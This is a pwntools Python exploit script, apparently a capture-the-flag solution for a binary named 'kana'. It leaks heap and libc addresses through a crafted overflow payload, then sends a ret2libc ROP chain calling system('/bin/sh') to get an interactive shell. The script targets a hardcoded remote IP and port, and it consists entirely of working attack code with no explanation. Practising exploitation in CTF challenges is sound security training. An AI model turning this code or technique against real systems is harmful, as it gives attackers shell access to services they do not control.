#!/usr/bin/python3

from pwn import *

exe = ELF('kana_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe

def GDB():
    gdb.attach(r, gdbscript='''
        b*0x55555555ac6f
        b*0x55555555b6df
        # b*0x55555555b855
        b*0x55555555b830
        c
    ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)

if args.REMOTE:
    r = remote('165.22.116.7', 30737)
else:
    r = process(exe.path)
    GDB()
    
def new_kana(note):
    sla(b'>> ', b'4')
    sla(b'>> ', note)
    
def choice(choice, note = b''):
    sa(b'>> ', choice)
    sl(note)

libc_off = 0x219d10
pop_rdi_off = 0x000000000002a3e5
ret_off = 0x0000000000029cd6

new_kana(b'a'*0x430)
payload = b'a'*0x5c + p8(0xc0-1)
choice(payload, b'')

r.recvuntil(b': ')
heap = r.recv(16)[8:16]
heap = u64(heap)
print(hex(heap))

newheap = heap + 0x6e0
print(hex(newheap))
choice(payload, p64(newheap))

r.recvuntil(b': ')
libc.address = u64(r.recv(8)) - libc_off
print(hex(libc.address))

ret = libc.address + pop_rdi_off + 1
pop_rdi = libc.address + pop_rdi_off
print(hex(ret))
print(hex(pop_rdi))

payload = b'a'*0x5c + p8(0x78-1)
payload += flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    ret,
    libc.sym['system']
    )
choice(payload)

r.interactive()
